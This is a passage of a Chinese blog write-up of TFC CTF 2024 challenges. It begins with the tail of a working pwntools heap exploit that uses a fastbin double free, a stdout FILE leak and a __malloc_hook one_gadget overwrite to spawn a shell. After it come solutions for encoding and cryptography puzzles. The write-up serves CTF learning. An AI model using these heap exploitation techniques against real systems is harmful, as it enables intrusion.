class="built_in">bytes</span>):</span><br><span class="line">    got = libc.createress + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt_trampoline = libc.createress + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_creater</span><br><span class="line">    <span class="keyword">return</span> got, flat(</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(got + <span class="number">0x218</span>),</span><br><span class="line">        p64(libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">32</span>),</span><br><span class="line">        p64(plt_trampoline) * <span class="number">0x40</span>,</span><br><span class="line">        create_ucontext(got + <span class="number">0x218</span>, rsp=libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, **kwargs),</span><br><span class="line">    )</span><br><span class="line"><span class="comment"># e.g. dest, payload = setcontext32.setcontext32(</span></span><br><span class="line"><span class="comment">#         libc, rip=libc.sym[&quot;system&quot;], rdi=libc.search(b&quot;/bin/sh&quot;).__next__()</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>): <span class="comment"># 0x70</span></span><br><span class="line">    sla(<span class="string">b&quot;[+]&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;[+]&gt; &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&quot;Data?&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;[+]&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;[+]&gt; &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + <span class="string">b&quot;fkchunk0&quot;</span> + p64(<span class="number">0x71</span>)) <span class="comment">#0 # fkchunk0 = 0x555555605020</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;B&quot;</span> * <span class="number">8</span>) <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;C&quot;</span> * <span class="number">8</span>) <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;D&quot;</span> * <span class="number">8</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&quot;\x20\x50&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;C&quot;</span> * <span class="number">8</span>) <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;B&quot;</span> * <span class="number">8</span>) <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;D&quot;</span> * <span class="number">8</span>) <span class="comment"># 7 # fkchunk0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>)) <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># delete fkchunk0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>) </span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0X61</span>)) <span class="comment"># 9 # segmentation unsortedbin and create fakechunk1 0x555555605040</span></span><br><span class="line"><span class="comment"># # heap overlap chunk[1].fd = main_arena + 88</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg&gt; x /40gx 0x7ffff7bc2600 - 0x43</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc25bd &lt;_IO_2_1_stderr_+157&gt;:	0xfff7bc1640000000	0x000000000000007f</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc25cd &lt;_IO_2_1_stderr_+173&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc25dd &lt;_IO_2_1_stderr_+189&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc25ed &lt;_IO_2_1_stderr_+205&gt;:	0x0000000000000000	0xfff7bbe400000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc25fd &lt;_IO_2_1_stderr_+221&gt;:	0x00fbad288700007f	0xfff7bc2683000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc260d &lt;_IO_2_1_stdout_+13&gt;:	0xfff7bc268300007f	0xfff7bc268300007f</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc261d &lt;_IO_2_1_stdout_+29&gt;:	0xfff7bc268300007f	0xfff7bc268300007f</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc262d &lt;_IO_2_1_stdout_+45&gt;:	0xfff7bc268300007f	0xfff7bc268300007f</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc263d &lt;_IO_2_1_stdout_+61&gt;:	0xfff7bc268400007f	0x000000000000007f</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc264d &lt;_IO_2_1_stdout_+77&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc265d &lt;_IO_2_1_stdout_+93&gt;:	0x0000000000000000	0xfff7bc18c0000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc266d &lt;_IO_2_1_stdout_+109&gt;:	0x000000000100007f	0xffffffffff000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc267d &lt;_IO_2_1_stdout_+125&gt;:	0x000a000000ffffff	0xfff7bc3760000000</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc268d &lt;_IO_2_1_stdout_+141&gt;:	0xffffffffff00007f	0x0000000000ffffff</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc269d &lt;_IO_2_1_stdout_+157&gt;:	0xfff7bc1780000000	0x000000000000007f</span></span><br><span class="line"><span class="comment"># 0x7ffff7bc26ad &lt;_IO_2_1_stdout_+173&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">b&quot;\xbd\x25&quot;</span>) <span class="comment"># 10 # segmentation unsortedbin; chunk[1].fd = stdout</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;E&quot;</span> * <span class="number">8</span>) <span class="comment"># 11</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;F&quot;</span> * <span class="number">8</span>) <span class="comment"># 12</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;\x40\x50&quot;</span>) <span class="comment"># 13</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;D&quot;</span> * <span class="number">8</span>) <span class="comment"># 14</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;B&quot;</span> * <span class="number">8</span>) <span class="comment"># 15</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># 16 # modify chunk[1].chunksize = 0x71</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;SSSSS&quot;</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0</span>) <span class="comment">#</span></span><br><span class="line">create(<span class="number">0x61</span>,payload) <span class="comment"># 17</span></span><br><span class="line"></span><br><span class="line">rl()</span><br><span class="line"><span class="built_in">print</span>(r(<span class="number">0x20</span>))</span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c2600</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xce0e5</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;[+]&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;[+]&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0x8</span>).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="DISCORD-SHENANIGANS-V4"><a href="#DISCORD-SHENANIGANS-V4" class="headerlink" title="DISCORD SHENANIGANS V4"></a>DISCORD SHENANIGANS V4</h2><p>discord上的机器人回复信息里有零宽字符，在复制信息的时候发现的</p>
<p><img src="/./G:/ctf/tfcctf/img/1722599774224.png" alt="1722599774224"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ccccc"><a href="#ccccc" class="headerlink" title="ccccc"></a>ccccc</h2><p>去掉c字符后发现是ascii编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5c4c4c6c4c3c4c3c5c4c4c6c7cbc6c3c7c3c6c8c6cfc7c5c7c4c5cfc6c3c6cfc7c5c7c4c5cfc6c3c7c4c3c0c5cfc6c3c6cdc7c9c5cfc6c3c6c2c3c0c7c9c5cfc6c3c3c4c6cec6c4c5cfc6c3c6cdc7c9c5cfc6c3c6c4c6cfc6c7c5cfc6c3c6c1c6cec6c4c5cfc6c3c6cdc7c9c5cfc6c3c6c3c3c4c3c7c7cdc0ca</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hex_string = <span class="string">&quot;5446434354467b6373686f75745f636f75745f6374305f636d795f636230795f63346e645f636d795f63646f675f63616e645f636d795f636334377d0a&quot;</span></span><br><span class="line">data = [hex_string[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_string), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">16</span>)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="GENETICS"><a href="#GENETICS" class="headerlink" title="GENETICS"></a>GENETICS</h2><p>通过搜索发现是一段dna编码 每一组是8bit，刚刚好可以用来表示一个字节，把ACGT四个字符映射回去后 再重新编码用ascii表示可以求出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CCCA CACG CAAT CAAT CCCA CACG CTGT ATAC CCTT CTCT ATAC CGTA CGTA CCTT CGCT ATAT CTCA CCTT CTCA CGGA ATAC CTAT CCTT ATCA CTAT CCTT ATCA CCTT CTCA ATCA CTCA CTCA ATAA ATAA CCTT CCCG ATAT CTAG CTGC CCTT CTAT ATAA ATAA CGTG CTTC</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;00&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;10&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;11&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dna_to_char</span>(<span class="params">dna_sequence</span>):</span><br><span class="line">    binary_string = <span class="string">&#x27;&#x27;</span>.join([mapping[i] <span class="keyword">for</span> i <span class="keyword">in</span> dna_sequence])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">int</span>(binary_string, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">dna_sequences = [</span><br><span class="line">    <span class="string">&quot;CCCA&quot;</span>, <span class="string">&quot;CACG&quot;</span>, <span class="string">&quot;CAAT&quot;</span>, <span class="string">&quot;CAAT&quot;</span>, <span class="string">&quot;CCCA&quot;</span>, <span class="string">&quot;CACG&quot;</span>, <span class="string">&quot;CTGT&quot;</span>, <span class="string">&quot;ATAC&quot;</span>, <span class="string">&quot;CCTT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CTCT&quot;</span>, <span class="string">&quot;ATAC&quot;</span>, <span class="string">&quot;CGTA&quot;</span>, <span class="string">&quot;CGTA&quot;</span>, <span class="string">&quot;CCTT&quot;</span>, <span class="string">&quot;CGCT&quot;</span>, <span class="string">&quot;ATAT&quot;</span>, <span class="string">&quot;CTCA&quot;</span>, <span class="string">&quot;CCTT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CTCA&quot;</span>, <span class="string">&quot;CGGA&quot;</span>, <span class="string">&quot;ATAC&quot;</span>, <span class="string">&quot;CTAT&quot;</span>, <span class="string">&quot;CCTT&quot;</span>, <span class="string">&quot;ATCA&quot;</span>, <span class="string">&quot;CTAT&quot;</span>, <span class="string">&quot;CCTT&quot;</span>, <span class="string">&quot;ATCA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CCTT&quot;</span>, <span class="string">&quot;CTCA&quot;</span>, <span class="string">&quot;ATCA&quot;</span>, <span class="string">&quot;CTCA&quot;</span>, <span class="string">&quot;CTCA&quot;</span>, <span class="string">&quot;ATAA&quot;</span>, <span class="string">&quot;ATAA&quot;</span>, <span class="string">&quot;CCTT&quot;</span>, <span class="string">&quot;CCCG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ATAT&quot;</span>, <span class="string">&quot;CTAG&quot;</span>, <span class="string">&quot;CTGC&quot;</span>, <span class="string">&quot;CCTT&quot;</span>, <span class="string">&quot;CTAT&quot;</span>, <span class="string">&quot;ATAA&quot;</span>, <span class="string">&quot;ATAA&quot;</span>, <span class="string">&quot;CGTG&quot;</span>, <span class="string">&quot;CTTC&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = [dna_to_char(seq) <span class="keyword">for</span> seq <span class="keyword">in</span> dna_sequences]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="CONWAY"><a href="#CONWAY" class="headerlink" title="CONWAY"></a>CONWAY</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> generate_next_key, flag</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">initial = <span class="number">11131221131211131231121113112221121321132132211331222113112211</span></span><br><span class="line"></span><br><span class="line">initial = generate_next_key(initial)</span><br><span class="line"><span class="built_in">print</span>(initial)</span><br><span class="line"></span><br><span class="line">initial = generate_next_key(initial)</span><br><span class="line">h = hashlib.sha256()</span><br><span class="line">h.update(<span class="built_in">str</span>(initial).encode())</span><br><span class="line">key = h.digest()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(cipher.encrypt(pad(flag.encode(),<span class="number">16</span>)).<span class="built_in">hex</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>output.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">311311222113111231131112132112311321322112111312211312111322212311322113212221</span><br><span class="line">f143845f3c4d9ad024ac8f76592352127651ff4d8c35e48ca9337422a0d7f20ec0c2baf530695c150efff20bbc17ca4c</span><br></pre></td></tr></table></figure>

<p>这个的目标其实是算出key，key的生成是依赖于generate_next_key，我搜了一下initial和output 搜到了一个叫外观数列的信息，这是一个第<em>n</em>项描述了第<em>n</em>-1项的数字分布 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%A4%96%E8%A7%80%E6%95%B8%E5%88%97">https://zh.wikipedia.org/wiki/%E5%A4%96%E8%A7%80%E6%95%B8%E5%88%97</a></p>
<p>generate_next_key其实就是一个根据inital生成外观数列的函数，只需要把外观数列的生成函数实现出来就能求出key了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_next_key</span>(<span class="params">s</span>):</span><br><span class="line">    result = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(s):</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(s) <span class="keyword">and</span> s[i] == s[i + <span class="number">1</span>]:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        result.append(<span class="built_in">str</span>(count) + s[i])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">initial = <span class="string">&#x27;11131221131211131231121113112221121321132132211331222113112211&#x27;</span></span><br><span class="line"></span><br><span class="line">initial = generate_next_key(initial)</span><br><span class="line">initial = generate_next_key(initial)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(initial)</span><br><span class="line"></span><br><span class="line">h = hashlib.sha256()</span><br><span class="line">h.update(initial.encode())</span><br><span class="line">key = h.digest()</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;f143845f3c4d9ad024ac8f76592352127651ff4d8c35e48ca9337422a0d7f20ec0c2baf530695c150efff20bbc17ca4c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">decrypted_flag = unpad(cipher.decrypt(ciphertext), <span class="number">16</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_flag)</span><br></pre></td></tr></table></figure>


    </article>
    <!-- license -->
    
        <div class="license-wrapper">
            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
            <p>Link：<a href="https://nyyyddddn.github.io/2024/08/08/tfcctf2024/">https://nyyyddddn.github.io/2024/08/08/tfcctf2024/</a>
            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/08/08/tfcctf2024/">August 8th 2024, 12:39:15 am</a>
            <p>Update date：<a href="https://nyyyddddn.github.io/2024/08/08/tfcctf2024/">September 5th 2024, 9:56:15 pm</a>
            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/" title="奇奇怪怪格式化字符串漏洞的利用1">
                    <div class="nextTitle">奇奇怪怪格式化字符串漏洞的利用1</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2024/08/01/ImaginaryCTF/" title="ImaginaryCTF">
                    <div class="prevTitle">ImaginaryCTF</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
            
                <a href="mailto:1959759892@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/nyyyddddn" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GUARD-THE-BYPASS"><span class="toc-number">1.1.</span> <span class="toc-text">GUARD-THE-BYPASS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vspm"><span class="toc-number">1.2.</span> <span class="toc-text">vspm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mcback2dabasics"><span class="toc-number">1.3.</span> <span class="toc-text">mcback2dabasics</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DISCORD-SHENANIGANS-V4"><span class="toc-number">2.1.</span> <span class="toc-text">DISCORD SHENANIGANS V4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ccccc"><span class="toc-number">3.1.</span> <span class="toc-text">ccccc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GENETICS"><span class="toc-number">3.2.</span> <span class="toc-text">GENETICS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CONWAY"><span class="toc-number">3.3.</span> <span class="toc-text">CONWAY</span></a></li></ol></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
